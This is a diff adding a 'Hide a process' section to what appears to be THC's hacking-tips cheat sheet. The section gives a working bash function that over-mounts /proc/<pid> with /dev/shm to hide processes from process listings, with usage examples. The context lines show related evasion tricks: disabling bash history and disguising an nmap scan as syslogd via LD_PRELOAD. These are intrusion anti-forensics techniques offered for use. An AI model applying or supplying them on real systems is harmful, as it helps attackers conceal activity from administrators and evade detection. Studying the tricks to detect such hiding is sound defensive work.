@@ -10,6 +10,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Leave Bash without history](#lbwh-anchor)
    1. [Hide your command](#hyc-anchor)
    1. [Hide your arguments](#hya-anchor)
+   1. [Hide a process](#hide-a-process)
 1. [SSH](#ais-anchor)
    1. [Almost invisible SSH](#ais-anchor)
    1. [SSH tunnel OUT](#sto-anchor)
@@ -119,6 +120,31 @@ gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
 LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24
 ```
 Note: There is a gdb variant as well. Anyone?
+
+<a id="hide-a-process"></a>
+**1.iv. Hide a process**
+
+This requires ```root`` privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
+```sh
+hide()
+{
+    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
+    _pid=${1:-$$}
+    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
+    local _argstr
+    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
+    [[ $(bash -c "ps -o etimes= -p \$PPID") -eq 0 ]] && exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
+    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
+}
+```
+
+The use this to hide a command:
+```sh
+hide                                 # Hides the current shell/PID
+hide 31337                           # Hides process with pid 31337
+hide sleep 1234                      # Hides 'sleep 1234'
+hide nohup sleep 1234 &>/dev/null &  # Starts and hides the hidden background process 'sleep 1234'
+```
 
 ---
 <a id="ais-anchor"></a>
